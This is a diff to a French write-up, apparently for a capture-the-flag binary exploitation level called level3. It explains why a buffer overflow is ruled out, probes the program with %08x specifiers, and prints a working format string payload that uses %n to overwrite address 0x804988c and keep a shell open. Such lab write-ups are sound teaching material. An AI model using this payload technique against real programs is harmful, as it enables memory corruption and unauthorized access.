@@ -48,7 +48,7 @@
 - Les exploits par overflow de buffer ne sont pas possibles (utilisation de *fgets* plutôt que *gets*)
 - Une autre vulnérabilité commune des programmes ELF est la [*Format String Attack*](https://owasp.org/www-community/attacks/Format_string_attack) ou [*Uncontrolled Format String*](https://en.wikipedia.org/wiki/Uncontrolled_format_string)
 
-- `./level3` et `AAA0_%08x.%08x.%08x.%08x`
+- Avec `./level3` et `AAA0_%08x.%08x.%08x.%08x`, on constate que notre chaine est réécrite à partir du 4ème octet :
   > AAA0_00000200.b7fd1ac0.b7ff37d0.30414141
 - Pour écraser `0x804988c` (`\x8c\x98\x04\x08`), on peut utiliser l'option `%n` *(qui écrit le nombre de caractères précédents)* de printf (avec `$4` pour cibler la 4 ème adresse de la stack) :
     `(python -c 'print("\x8c\x98\x04\x08"+60*"A"+"%4$n")' ; cat -) | ./level3`
